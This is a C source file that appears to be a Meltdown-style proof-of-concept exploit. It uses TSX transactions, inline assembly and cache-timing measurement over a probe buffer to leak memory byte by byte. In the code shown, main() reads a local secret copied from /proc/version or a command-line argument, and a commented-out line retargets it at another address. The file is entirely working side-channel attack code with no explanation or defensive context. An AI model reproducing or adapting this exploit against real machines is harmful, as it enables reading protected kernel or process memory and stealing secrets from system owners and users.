#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include "meltlib.h"

#define MEASURE_TIME 0

unsigned char get1byte(size_t ptr, char* buf, int page_size)
{
  int c, i, status = 0, min_idx = 0;
  unsigned char victim = 0;
  unsigned long long times[256]; // store the time.
  unsigned long long total[256];
  unsigned int tests[256]; // count the number of times when this page is the fastest.
   
  memset(tests, 0, sizeof(tests));
  memset(times, 0, sizeof(times));
  memset(total, 0, sizeof(total));
   
  for (c = 0; c < 16; c++) {
    for (i=0; i<256; i++) {
      flush(&buf[i * page_size]);
    }
   
    if ((status = _xbegin()) == _XBEGIN_STARTED) {
      asm __volatile__ (
        "%=:\n"
        "xorq %%rax, %%rax \n"
        "movb (%[ptr]), %%al \n"
        "shlq $0xc, %%rax \n"
        "jz %=b \n"
        "movq (%[buf], %%rax, 1), %%rbx \n"
        : 
        :  [ptr] "r" (ptr), [buf] "r" (buf)
        :  "%rax", "%rbx");
      
      _xend();
    } else {
       asm __volatile__ ("mfence\n" :::);
    }

/*
      _xbegin();
      asm __volatile__ (
        "%=:\n"
        "xorq %%rax, %%rax \n"
        "movb (%[ptr]), %%al \n"
        "shlq $0xc, %%rax \n"
        "jz %=b \n"
        "movq (%[buf], %%rax, 1), %%rbx \n"
        : 
        :  [ptr] "r" (ptr), [buf] "r" (buf)
        :  "%rax", "%rbx");
      
      _xend();
*/
    for (i=0; i<256; i++) {
      times[i] = measure_time(&buf[i * page_size]);
      total[i] += times[i];
    }// measure the time.
    for (i=0; i<256; i++) {
      min_idx = (times[min_idx] > times[i]) ? i : min_idx;
    }
      
    tests[min_idx]++;
  }
   
  for (i=0; i<256; i++) {
    victim = (tests[i] > tests[victim]) ? i : victim;
  }
   

  FILE *f = fopen("data.txt", "a");
  for (i = 0; i < 256; i++) {
    total[i] /= 16;
    if(MEASURE_TIME)
      fprintf(f, "%d\t%llu\n", i, total[i]);
  }

  fclose(f);

  return (unsigned char)victim;
}

int main(int argc, char** argv)
{
  unsigned char read_buf[17] = {0};
  int page_size = getpagesize();
  unsigned long t, len = 0;

  FILE *fp = fopen("/proc/version", "r");

  static char secret[128];
  memset(secret, 0, sizeof(secret));

  if(argc == 1)
    fgets(secret, 128, fp);
  else
    strcpy(secret, argv[1]);

  unsigned long start_addr = (unsigned long)secret;
  len = strlen(secret);

  //unsigned long start_addr = 0x2;
  //len = 1024;

  char* poke = (char*)mmap(NULL, 256 * page_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, -1, 0);
      
  if (poke == MAP_FAILED) {
    printf("mmap() failed: %s\n", strerror(errno));
    return -1;
  }
   
  for (t=0; t<len; t++) {
    if (t > 0 && t % 16 == 0) {
      printf("%s", read_buf);
      memset(read_buf, 0, sizeof(read_buf));
    }
      
    read_buf[t%16] = get1byte(start_addr + t, poke, page_size);
  }
   
  if (t > 0) {
    printf("%s\n", read_buf);
  }
  munmap((void*)poke, 256 * page_size);
  fclose(fp);

  return 0;
}
